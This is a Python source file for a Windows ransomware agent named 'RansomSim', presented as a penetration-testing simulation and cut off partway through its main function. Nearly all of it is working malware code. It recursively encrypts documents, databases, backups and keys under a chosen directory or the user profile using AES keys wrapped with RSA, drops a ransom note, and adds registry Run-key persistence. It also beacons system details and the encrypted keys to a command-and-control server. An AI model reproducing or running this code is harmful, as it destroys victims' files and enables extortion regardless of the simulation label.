#!/usr/bin/env python3
"""
RansomSim Ransomware Agent
Windows ransomware simulation with:
- Recursive file encryption (AES-256-CTR per file)
- RSA-4096 wraps each AES key
- Encrypted AES key exfiltrated to C2 server
- Ransom note dropped on desktop
- Persistence simulation (registry run key)
- HTTP beaconing to C2
"""
import os
import io
import sys
import json
import base64
import uuid
import socket
import platform
import datetime
import threading
import time
import random
import urllib.request
import urllib.error

# ============================================================
# CONFIGURATION — Customize these for your test environment
# ============================================================

# C2 Server
C2_HOST = "192.168.1.100"   # CHANGE THIS to your C2 server IP
C2_PORT = 8443
BEACON_INTERVAL = 60         # seconds between beacons

# RSA Public Key (embed from keygen output)
PUBLIC_KEY_PEM = """\
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAz+XM2+6E1dwsnGk0EL0N
f3nYB5tjyY0GAoxrrABgno/U8MO0hJcBL8bE/r6CBqJYki4wx0Hixuk8pnVoOFGe
AiJX8Ejmi15h6Ef7cPt5relOZgGPGVHHz9woP/SF2v1IX3/IQvfFLFn5Nh4l+j4p
0an7fBgoj5lF9Qq4Lx6IBvNcmCZX2TzGYqgHSXFoapJb1bhy1RatWpk4gF2bpu3c
Y6wASKX4O7G0YmnSYU++Q31kIF4zsm8S2kRlNSMQUs5gPK6NCElH4M3xUyfo1LCB
00VZif33siQ8ZIDV4vZ6+EB4yvr+q8CL1G5V99RxReQ3ULJxUxaTCFfq8JS63G+2
1qCrsO1fIjG5kekRjoujUshHIDHS5aYmSLuLL/wUSV+4GDzvxH++JiNPd2BoQn5S
VQFK97kqa5MrJKDY8vY0xRnPUAMIxFJQVfw/HI+gxPBnBlMSRSb2v0L86lG48heh
YjpE/kQ5DQ9Yki3P5JFX6FlpXy9tsCQU2QCEfGY/BqG8WBCIkXALVLts0gETIVBS
djKz1pQ3P4rGhtB/0Nsts7wGiGqSxpAQ8o5pmi5phZ0Qul8grqf9K64u63D+8BkI
/HJcmJljvpL+BZuki+4x2pTr+K67ns2WsPqQgnccFlJTKh+WYUKo/4vszWq50n3e
VcoRBkWbV1CYvhfiqYHN0p0CAwEAAQ==
-----END PUBLIC KEY-----"""

# Target file extensions (WannaCry-style)
TARGET_EXTENSIONS = {
    # Office
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".pps", ".ppsx", ".odt", ".ods", ".odp",
    # PDF & Text
    ".pdf", ".txt", ".csv", ".rtf", ".tex",
    # Archives
    ".zip", ".rar", ".tar", ".gz", ".bz2", ".7z",
    # Images
    ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".svg", ".raw",
    # Audio/Video
    ".mp3", ".mp4", ".wav", ".avi", ".mkv", ".mov", ".wmv", ".flv",
    # Databases
    ".sql", ".db", ".mdb", ".accdb", ".sqlite", ".dbf",
    # Email
    ".pst", ".ost", ".msg", ".eml",
    # Source code
    ".py", ".js", ".ts", ".html", ".css", ".php", ".java", ".cpp",
    ".c", ".h", ".cs", ".rb", ".go", ".rs", ".swift", ".kt",
    # Config
    ".json", ".xml", ".yaml", ".yml", ".ini", ".cfg", ".conf",
    # VM
    ".vmdk", ".vdi", ".vhd", ".vhdx", ".ova", ".ovf",
    # Crypto/Keys
    ".pem", ".key", ".pfx", ".p12", ".asc", ".gpg",
    # Backup
    ".bak", ".backup", ".old", ".dmp", ".dat",
}

# Directories to skip (system dirs)
SKIP_DIRS = {
    "windows", "winnt", "$recycle.bin", "system volume information",
    "boot", "recovery", "program files", "program files (x86)",
    "programdata", "appdata", "mozilla", "google",
}

# Execluded extensions (never encrypt these)
EXCLUDE_EXT = {
    ".exe", ".dll", ".sys", ".lnk", ".ini",
    ".ransomed", ".ransomware_sim_key",
}

# Ransom note content
RANSOM_NOTE = """\
======================================================================
  YOUR FILES HAVE BEEN ENCRYPTED
======================================================================

All your important documents, photos, databases, and other files
have been encrypted with AES-256-CTR encryption.

To recover your files, you must contact the C2 server operator.

Your unique Agent ID: {agent_id}

The encryption key has been securely transmitted to the C2 server.

======================================================================
  DO NOT attempt to decrypt files yourself - you may lose them.
  DO NOT modify or rename encrypted files.
======================================================================
"""

ENCRYPTED_EXT = ".encrypted"


def get_agent_id():
    """Generate a unique agent identifier."""
    hostname = socket.gethostname()
    mac = uuid.getnode()
    return f"{hostname}-{mac:012x}"


def get_system_info():
    """Collect system information for the beacon."""
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
    except:
        ip = "0.0.0.0"

    return {
        "hostname": hostname,
        "username": os.environ.get("USERNAME", os.environ.get("USER", "unknown")),
        "ip": ip,
        "platform": platform.platform(),
        "processor": platform.processor(),
        "machine": platform.machine(),
        "timestamp": datetime.datetime.now().isoformat(),
    }


def get_public_key():
    """Load the embedded RSA public key."""
    from cryptography.hazmat.primitives import serialization
    return serialization.load_pem_public_key(PUBLIC_KEY_PEM.encode())


def encrypt_aes_key_with_rsa(aes_key):
    """Encrypt an AES key using the embedded RSA public key."""
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding

    public_key = get_public_key()
    encrypted = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )
    return base64.b64encode(encrypted).decode()


def encrypt_file_aes_ctr(file_path, aes_key):
    """Encrypt a single file with AES-256-CTR."""
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    # Generate random nonce (IV) for CTR mode (16 bytes)
    nonce = os.urandom(16)

    with open(file_path, "rb") as f:
        plaintext = f.read()

    cipher = Cipher(algorithms.AES(aes_key), modes.CTR(nonce))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext) + encryptor.finalize()

    # Write: [nonce (16 bytes)][ciphertext]
    with open(file_path, "wb") as f:
        f.write(nonce)
        f.write(ciphertext)

    return nonce, ciphertext


def decrypt_file_aes_ctr(file_path, aes_key):
    """Decrypt a file encrypted with AES-256-CTR (for testing)."""
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    with open(file_path, "rb") as f:
        nonce = f.read(16)
        ciphertext = f.read()

    cipher = Cipher(algorithms.AES(aes_key), modes.CTR(nonce))
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()

    with open(file_path, "wb") as f:
        f.write(plaintext)


def should_encrypt(file_path):
    """Check if a file should be encrypted."""
    ext = os.path.splitext(file_path)[1].lower()
    base = os.path.basename(file_path)

    # Skip already encrypted files
    if file_path.endswith(ENCRYPTED_EXT):
        return False

    # Skip excluded extensions
    if ext in EXCLUDE_EXT:
        return False

    # Skip if the renamed version would exist (already processed)
    renamed = file_path + ENCRYPTED_EXT
    if os.path.exists(renamed):
        return False

    # Check if it's in our target list (or no extension)
    return ext in TARGET_EXTENSIONS or ext == ""


def is_skippable_dir(dirname):
    """Check if a directory should be skipped."""
    return dirname.lower() in SKIP_DIRS


def walk_and_encrypt(start_path, aes_key, max_files=0):
    """Recursively walk directories and encrypt target files."""
    encrypted_count = 0
    target_files = []

    # First, collect all target files
    for root, dirs, files in os.walk(start_path, topdown=True):
        # Skip system directories
        dirs[:] = [d for d in dirs if not is_skippable_dir(d)]

        for fname in files:
            fpath = os.path.join(root, fname)
            if should_encrypt(fpath):
                target_files.append(fpath)

    print(f"[*] Found {len(target_files)} target files to encrypt under {start_path}")

    # Encrypt files
    for fpath in target_files:
        if max_files > 0 and encrypted_count >= max_files:
            break
        try:
            renamed_path = fpath + ENCRYPTED_EXT
            os.rename(fpath, renamed_path)
            encrypt_file_aes_ctr(renamed_path, aes_key)
            encrypted_count += 1
            if encrypted_count % 10 == 0:
                print(f"    Encrypted {encrypted_count} files...")
        except (PermissionError, OSError):
            # Try to restore original name
            try:
                os.rename(renamed_path, fpath)
            except:
                pass
            continue
        except Exception as e:
            continue

    return encrypted_count


def drop_ransom_note(agent_id):
    """Drop ransom note on desktop and in user directory."""
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    user_dir = os.path.expanduser("~")
    note_content = RANSOM_NOTE.format(agent_id=agent_id)

    for base_dir in [desktop, user_dir]:
        note_path = os.path.join(base_dir, "README_RANSOMWARE.txt")
        try:
            with open(note_path, "w") as f:
                f.write(note_content)
            print(f"[+] Ransom note dropped: {note_path}")
        except:
            pass


def add_persistence():
    """Simulate persistence via Windows registry run key."""
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE
        ) as key:
            winreg.SetValueEx(
                key, "RansomSim", 0, winreg.REG_SZ,
                os.path.abspath(sys.argv[0])
            )
        print("[+] Persistence added via HKCU Run key")
    except (ImportError, Exception) as e:
        print(f"[-] Could not add persistence: {e}")


def beacon_to_c2(agent_id, system_info, encrypted_keys_b64, file_count, status="active"):
    """Send beacon to C2 server."""
    payload = {
        "agent_id": agent_id,
        "system_info": system_info,
        "encrypted_keys": encrypted_keys_b64,
        "file_count": file_count,
        "status": status,
    }
    data = json.dumps(payload).encode()
    url = f"http://{C2_HOST}:{C2_PORT}/beacon"

    try:
        req = urllib.request.Request(
            url, data=data,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            response = json.loads(resp.read().decode())
            print(f"[+] Beacon sent: {response}")
            return response
    except Exception as e:
        print(f"[-] Beacon failed: {e}")
        return None


def beacon_loop(agent_id, system_info, encrypted_keys_b64, file_count):
    """Continuous beaconing loop."""
    while True:
        beacon_to_c2(agent_id, system_info, encrypted_keys_b64, file_count)
        time.sleep(BEACON_INTERVAL)


def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║                  RansomSim Ransomware Agent                   ║
║                    Windows Simulation                         ║
╠══════════════════════════════════════════════════════════════╣
║  [!] FOR AUTHORIZED PENETRATION TESTING ONLY                 ║
║  [!] Running in: SIMULATION MODE                             ║
╚══════════════════════════════════════════════════════════════╝
    """)

    # WARNING: Safety check
    print("[!] TARGET DIRECTORY SELECTION")
    print("    1. Encrypt a TEST directory (specify path)")
    print("    2. Encrypt user profile directory (~)")
    print("    3. Decrypt previously encrypted files (requires AES key)")

    choice = input("[?] Select mode (1/2/3): ").strip()

    if choice == "3":
        # Decryption mode
        agent_id = get_agent_id()
        print(f"\n[*] Agent ID: {agent_id}")
        key_hex = input("[?] Enter AES key (hex): ").strip()
        try:
            aes_key = bytes.fromhex(key_hex)
        except:
            print("[-] Invalid key")
            return
